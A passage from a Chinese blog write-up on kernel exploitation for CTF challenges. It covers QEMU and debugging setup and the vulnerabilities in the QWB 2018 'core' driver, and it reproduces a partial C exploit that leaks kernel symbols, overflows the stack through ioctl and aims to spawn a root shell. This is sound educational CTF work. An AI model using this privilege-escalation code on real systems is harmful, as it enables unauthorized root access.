<p>让虚拟机运行在无图形模式（纯终端模式）。禁用图形输出窗口（例如 VGA 显示），仅使用标准输入输出（例如通过 <code>ttyS0</code> 访问）。</p>
<p><strong>-kernel “bzImage”</strong></p>
<p>指定要加载的 Linux 内核文件，通常是已编译好的 <code>bzImage</code> 文件。<strong><code>bzImage</code></strong> 是 Linux 内核的可引导压缩映像。</p>
<p><strong>-append “console=ttyS0 panic=-1 pti=off kaslr quiet”</strong></p>
<p>向内核传递启动参数：</p>
<ol>
<li><code>console=ttyS0</code><ul>
<li>将内核的输出和输入重定向到串行端口 <code>ttyS0</code>（第一个串行设备）。</li>
<li>这通常与 <code>-nographic</code> 一起使用。</li>
</ul>
</li>
<li><code>panic=-1</code><ul>
<li>如果内核遇到致命错误（panic），虚拟机会无限期地等待，不会自动重启。</li>
</ul>
</li>
<li><code>pti=off</code><ul>
<li>关闭 Page Table Isolation（PTI）。PTI 是一个用于缓解 Meltdown 漏洞的安全措施，但会影响性能。</li>
</ul>
</li>
<li><code>kaslr</code><ul>
<li>随机化内核地址空间布局（Kernel Address Space Layout Randomization）。</li>
<li>没有 <code>off</code> 说明功能是启用状态；在调试中可以关闭此功能。</li>
</ul>
</li>
<li><code>quiet</code><ul>
<li>启动时减少输出的日志信息，显示更简洁的控制台内容。</li>
</ul>
</li>
</ol>
<p><strong>-monitor /dev/null</strong></p>
<p>将 QEMU 的管理控制台（Monitor）的输入输出重定向到 <code>/dev/null</code>。QEMU 默认提供一个监控终端，用于控制虚拟机，这里通过设置为 <code>/dev/null</code> 禁用了该功能。</p>
<p><strong>-initrd “./rootfs.cpio”</strong></p>
<p>指定初始 RAM 磁盘（Initial RAM Disk），用 <code>./rootfs.cpio</code> 文件作为虚拟机的初始根文件系统。<strong><code>rootfs.cpio</code></strong> 是一个打包的 CPIO 格式文件系统，虚拟机启动时会加载并挂载它为根文件系统。</p>
<p><strong>-net user</strong></p>
<p>启用用户模式网络（User Networking）。提供简单的 NAT 网络环境，不需要额外配置主机的网络。</p>
<p><strong>-net nic</strong></p>
<p>创建一个虚拟网络接口卡（NIC，Network Interface Card），用作虚拟机的网络设备。</p>
<p>然后我们要对文件系统进行解压，之后就能在当前目录下得到整个文件系统结构。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250111224302985.png"
                      class=""
                >
<p>之后我们直接<code>./run.sh</code>跑一下，发现已经能够运行起来了，但是由于是本地的环境，所以flag还要我们自己手动设置一下。可以在root目录下自己手动创建一个ctfshow_flag，然后再打包回去文件系统。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250111224440566.png"
                      class=""
                >
<p>我们再仔细看看刚刚解压出的在根目录下的内容。其中有ctfshow.ko，也就是我们重点分析的漏洞存在的扩展模块。还有init文件，该文件是linux启动时的初始化文件，包含一些重要信息，而且可以修改该文件的一些内容来方便调试。我们来看看这道题的init里是什么内容。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">chown</span> -R 0:0 /                                                                                  </span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="built_in">export</span> PATH=/bin</span><br><span class="line"><span class="built_in">export</span> PATH=/sbin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line">[ -d /dev ] || <span class="built_in">mkdir</span> -m 0755 /dev</span><br><span class="line">[ -d /sys ] || <span class="built_in">mkdir</span> /sys</span><br><span class="line">[ -d /proc ] || <span class="built_in">mkdir</span> /proc</span><br><span class="line">[ -d /tmp ] || <span class="built_in">mkdir</span> /tmp</span><br><span class="line">[ -d /run ] || <span class="built_in">mkdir</span> /run</span><br><span class="line">[ -d /etc ] || <span class="built_in">mkdir</span> /etc</span><br><span class="line">[ -d /home ] || <span class="built_in">mkdir</span> /home</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> 644 /etc/passwd</span><br><span class="line"><span class="built_in">chmod</span> 644 /etc/group</span><br><span class="line"><span class="built_in">chown</span> -R root:root /</span><br><span class="line"><span class="built_in">chown</span> 0:0 /root/ctfshow_flag</span><br><span class="line"><span class="built_in">chmod</span> 400 /root/ctfshow_flag</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp</span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> ctfshow:ctfshow -R /home/ctfshow</span><br><span class="line"><span class="built_in">chmod</span> 777 /home/ctfshow</span><br><span class="line"><span class="built_in">chmod</span> 755 /dev</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /var/lock</span><br><span class="line">mount -t sysfs -o nodev,noexec,nosuid sysfs /sys</span><br><span class="line">mount -t proc -o nodev,nosuid proc /proc</span><br><span class="line"><span class="built_in">ln</span> -sf /proc/mounts /etc/mtab</span><br><span class="line">mount -t devtmpfs -o nosuid,mode=0755 udev /dev</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -t devpts -o noexec,nosuid,gid=5,mode=0620 devpts /dev/pts || <span class="literal">true</span></span><br><span class="line">mount -t tmpfs -o <span class="string">&quot;noexec,nosuid,size=10%,mode=0755&quot;</span> tmpfs /run</span><br><span class="line"></span><br><span class="line">insmod ctfshow.ko</span><br><span class="line"><span class="built_in">chmod</span> o+rw /dev/kqueue</span><br><span class="line"><span class="built_in">chmod</span> u+s /bin/ping</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/perf_event_paranoid</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">exec</span> 0&lt;/dev/console) 2&gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line">    <span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line">    <span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> /sbin/init <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>从该文件中我们能看出很多重要信息：</p>
<ul>
<li>flag的权限被设置为了只有root权限可读。</li>
<li>启用了kptr_restrict，perf_event_paranoid，dmesg_restrict的内核保护机制。</li>
<li>对 <code>/bin/ping</code> 设置了 SUID 属性，普通用户运行它时会临时具有 root 权限。如果该二进制文件可以被替换或加载动态链接库，则可能借此实现提权。</li>
<li>存在<code>/dev/kqueue</code>这个设备驱动模块，可能是漏洞利用的关键。</li>
</ul>
<h4 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h4><h5 id="vmlinux-to-elf"><a href="#vmlinux-to-elf" class="headerlink" title="vmlinux-to-elf"></a>vmlinux-to-elf</h5><p>此工具允许从 vmlinux/vmlinuz/bzImage/zImage 内核映像获取完全可分析的 .ELF 文件，其中包含恢复的函数和变量符号。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python3-pip</span><br><span class="line"><span class="built_in">sudo</span> pip3 install --upgrade lz4 zstandard git+https://github.com/clubby789/python-lzo@b4e39df</span><br><span class="line"><span class="built_in">sudo</span> pip3 install --upgrade git+https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure></div>
<p><strong>使用方式</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vmlinux-to-elf &lt;input_kernel.bin&gt; &lt;output_kernel.elf&gt;</span><br></pre></td></tr></table></figure></div>
<h5 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h5><p>用于获取gadget，比ropgadget快。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装</span></span><br><span class="line">pip3 install ropper</span><br></pre></td></tr></table></figure></div>
<p><strong>使用方式</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用，将结果存在g1文件里</span></span><br><span class="line">ropper --file ./vmlinux --nocolor &gt; g1</span><br></pre></td></tr></table></figure></div>
<h5 id="extract-vmlinux"><a href="#extract-vmlinux" class="headerlink" title="extract-vmlinux"></a>extract-vmlinux</h5><p>能够从bzImage等提取出vmlinux。这个脚本在我们编译出的内核源码的scripts目录下。</p>
<p><strong>使用方式</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure></div>
<h4 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h4><p>获取内核特定符号地址</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">grep prepare_kernel_cred  /proc/kallsyms</span><br><span class="line">grep commit_creds  /proc/kallsyms</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114201804986.png"
                      class=""
                >
<p>获取驱动加载基地址，又有不同的方式。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/modules</span><br><span class="line">grep module_name /proc/modules</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114202256392.png"
                      class=""
                >
<p>首先需要对 run.sh 做如下修改：</p>
<ul>
<li>添加 nokaslr 关闭地址随机化（不一定需要）。</li>
<li>添加 -s，因为 qemu 其实提供了调试内核的接口，我们可以在启动参数中添加 -gdb dev 来启动调试服务。最常见的操作为在一个端口监听一个 tcp 连接。 QEMU 同时提供了一个简写的方式 -s，表示 -gdb tcp::1234，即在 1234 端口开启一个 gdbserver。</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -m 256 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel <span class="string">&quot;bzImage&quot;</span> \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 panic=-1 pti=off nokaslr quiet&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd <span class="string">&quot;./rootfs.cpio&quot;</span> \</span><br><span class="line">    -net user \</span><br><span class="line">    -net nic    \</span><br><span class="line">    -s</span><br><span class="line">  </span><br></pre></td></tr></table></figure></div>
<p>然后我们就可以在启动qemu后，然后gdb远程连接到gdbserver进行调试。<code>-q</code>指定安静模式，<code>-ex</code>为启动gdb后立即执行指令。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gdb -q -ex <span class="string">&quot;target remote localhost:1234&quot;</span> </span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114203048016.png"
                      class=""
                >
<p>在启动内核后，我们可以使用 <code>add-symbol-file</code> 来添加符号信息，比如</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">add-symbol-file vmlinux addr_of_vmlinux </span><br><span class="line">add-symbol-file ./your_module.ko addr_of_ko</span><br></pre></td></tr></table></figure></div>
<h4 id="基础利用手法"><a href="#基础利用手法" class="headerlink" title="基础利用手法"></a>基础利用手法</h4><h5 id="kernel-ROP"><a href="#kernel-ROP" class="headerlink" title="kernel ROP"></a>kernel ROP</h5><h4 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h4><h5 id="强网杯-2018-core"><a href="#强网杯-2018-core" class="headerlink" title="强网杯 2018 - core"></a>强网杯 2018 - core</h5><p>首先我们解压文件系统，这里发现给出的<strong>core.cpio</strong>，但其类型是gzip压缩，所以我们要先用gunzip解压一下。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117004743103.png"
                      class=""
                >
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> core.cpio ./core.cpio.gz</span><br><span class="line">gunzip core.cpio.gz</span><br><span class="line">cpio -idmv &lt; core.cpio</span><br></pre></td></tr></table></figure></div>
<p>题目给出了<strong>gen_cpio.sh</strong>，这个是用来重新打包文件系统的，以便我们修改init。其会把当前目录下所有内容打包，压缩并输出到我们命令行提供第一个参数所指定的目录处。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#gen_cpio.sh</span></span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; <span class="variable">$1</span></span><br></pre></td></tr></table></figure></div>
<p>start.sh以及init文件的内容如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#start.sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------#</span></span><br><span class="line"><span class="comment">#init</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>然后我们尝试启动内核，但是会卡在启动界面，经过调试，我们把start.sh中的内存指派64M改为128M，就能够正常进入内核环境。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117005845709.png"
                      class=""
                >
<p>然后我们仔细看看init里面的内容，发现存在2分钟定时关闭，而且启动的shell是普通用户的shell(uid为1000)，并且禁用了dmesg的内核日志查看以及直接<code>cat /proc/kallsyms</code>获取符号位置。但这道题的init中还是贴心的先把<code>/proc/kallsyms</code>迁移到了<code>/tmp/kallsyms</code>，那么其实我们还是能查看符号的偏移位置。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117010622321.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117010705905.png"
                      class=""
                >
<p>为了后续调试方便，我们可以修改init文件并重新对文件系统进行打包。对init改动处有两点，首先把poweroff的部分都注释掉，然后把<code>setsid /bin/cttyhack setuidgid 1000 /bin/sh</code>中的1000改成0，从而去除了关机以及以root权限启动shell。之后重新打包。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./gen_cpio.sh ./mycore.cpio.gz</span><br><span class="line">gunzip mycore.cpio.gz</span><br><span class="line">cpio -idmv &lt; mycore.cpio</span><br></pre></td></tr></table></figure></div>
<p>之后在<strong>start.sh</strong>中把<strong>core.cpio</strong>改为<strong>mycore.cpio</strong>即可，之后启动就不会自动关机，且权限为root了。</p>
<p>然后就是看<strong>core.ko</strong>这个内核驱动模块的漏洞了。</p>
<p><strong>init_module</strong>注册了<strong>/proc/core</strong>，<strong>exit_core</strong>删除了<strong>/proc/core</strong></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117144829081.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117144951857.png"
                      class=""
                >
<p><strong>core_ioctl</strong>这个相当于堆题的菜单，有不同的功能选项。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145051360.png"
                      class=""
                >
<p><strong>core_read</strong>从 <code>v4[off]</code> 拷贝 64 个字节到a1，a1也就是后面我们可以传入的用户空间的一个缓冲区，而且全局变量 <code>off</code> 是我们能够控制的，因此可以合理的控制 <code>off</code> 来 将canary 和一些地址读取到用户空间的缓冲区，然后再自己把这个缓冲区内的内容输出，从而能泄露内核空间的一些地址。 </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145312844.png"
                      class=""
                >
<p><strong>core_copy_func()</strong> 从全局变量 <code>name</code> 中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是 <code>unsigned __int16</code>，但传递的长度是 <code>signed __int64</code>，因此如果控制传入的长度为 <code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了。 </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145441269.png"
                      class=""
                >
<p><strong>core_write()</strong> 向全局变量 <code>name</code> 上写，这样通过 <code>core_write()</code> 和 <code>core_copy_func()</code> 就可以控制 ropchain 了 </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145616435.png"
                      class=""
                >
<p>由于是第一次接触kernel pwn的exp编写，我这里直接拿exp来进行分析学习。这里先解释一下我们exp的目的，就是提权，像什么system(“/bin/sh”)，我们的exp实际可以直接调用，但是拿到的只是uid=1000的普通用户的权限。我们希望通过一系列内核漏洞的利用，最终能提高权限。而且内核漏洞的exp一般都是用c语言编写的，而不是之前所学pwn用python写exp脚本。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc exploit.c -static -masm=intel -g -o exploit</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * give_to_player [master●●] check ./core.ko</span></span><br><span class="line"><span class="comment">   ./core.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=549436d</span></span><br><span class="line"><span class="comment">   [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/core.ko&#x27;</span></span><br><span class="line"><span class="comment">       Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">       RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">       Stack:    Canary found</span></span><br><span class="line"><span class="comment">       NX:       NX enabled</span></span><br><span class="line"><span class="comment">       PIE:      No PIE (0x0)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);            <span class="comment">//打开符号表，获取各符号偏移</span></span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen(&quot;./test_kallsyms&quot;, &quot;r&quot;); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))        <span class="comment">//48条项目一组，一直找commit_creds和prepare_kernel_cred符号的地址</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);                  <span class="comment">//地址在前16个字节</span></span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);     <span class="comment">//以llx模式解析16个字节，正确解析出地址</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * give_to_player [master●●] bpython</span></span><br><span class="line"><span class="comment">                bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">                [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/vmli&#x27;</span></span><br><span class="line"><span class="comment">                    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">                    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">                    Stack:    Canary found</span></span><br><span class="line"><span class="comment">                    NX:       NX disabled</span></span><br><span class="line"><span class="comment">                    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; hex(vmlinux.sym[&#x27;commit_creds&#x27;] - 0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                &#x27;0x9c8e0&#x27;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf(&quot;vmlinux_base addr: %p\n&quot;, vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title 